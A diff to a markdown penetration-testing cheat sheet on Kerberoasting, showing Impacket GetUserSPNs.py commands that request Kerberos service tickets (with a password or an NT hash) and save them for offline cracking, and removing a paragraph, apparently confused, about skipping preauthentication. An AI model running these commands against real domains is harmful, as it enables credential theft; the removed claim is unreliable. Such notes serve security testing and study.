@@ -39,12 +39,6 @@ python3 GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -save -output
 python3 GetUserSPNs.py -request -dc-ip <IP> -hashes <LM_HASH>:<NT_HASH> <DOMAIN>/<USER> -save -outputfile hashes.txt
 ```
 
-If the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled, it's possible to request and receive a ticket to crack without a valid account on the domain. TL;DR You don't need a passsword.
-
-```bash
-python3 GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USER> -save -outputfile hashes.txt
-```
-
 - [Cracking Kerberos TGS Tickets Using Kerberoast](https://adsecurity.org/?p=2293)
 - [Dectecting Kerboasting Activity](https://adsecurity.org/?p=3458)
 - [Kerberos Overview](https://adsecurity.org/?p=227)
